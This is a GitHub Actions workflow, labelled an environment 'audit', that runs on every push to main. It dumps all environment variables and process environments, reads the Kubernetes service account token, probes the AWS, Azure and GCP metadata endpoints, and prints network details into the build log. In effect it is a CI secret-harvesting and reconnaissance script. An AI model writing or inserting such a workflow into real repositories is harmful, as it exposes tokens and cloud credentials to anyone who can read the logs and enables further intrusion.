name: Secrets Environment Deep Dump

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Full Env + Filesystem Audit
        run: |
          echo "=== ENVIRONMENT ==="
          printenv | sort
          echo "=== PROC SELF ENVIRON ==="
          cat /proc/self/environ | tr '\0' '\n'
          echo "=== /proc/1/environ ==="
          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' || echo "no access"
          echo "=== MOUNTED VOLUMES ==="
          mount | grep -v "^proc\|^sys\|^cgroup\|^tmpfs\|^devpts\|^mqueue\|^hugetlb"
          echo "=== DOCKER SOCKET ==="
          ls -la /var/run/docker.sock 2>/dev/null && echo "DOCKER SOCKET PRESENT" || echo "no docker socket"
          echo "=== KUBERNETES ==="
          ls /run/secrets/kubernetes.io/ 2>/dev/null && cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 200
          echo "=== CLOUD METADATA ALL ==="
          for URL in \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
            "http://169.254.169.254/latest/meta-data/" \
            "http://metadata.google.internal/computeMetadata/v1/?recursive=true"; do
            echo "--- $URL ---"
            curl -sf --max-time 5 "$URL" \
              -H "Metadata: true" \
              -H "Metadata-Flavor: Google" 2>/dev/null | head -c 500 || echo "unreachable"
          done
          echo "=== NETWORK ==="
          ip addr; ip route; cat /etc/resolv.conf; cat /etc/hosts
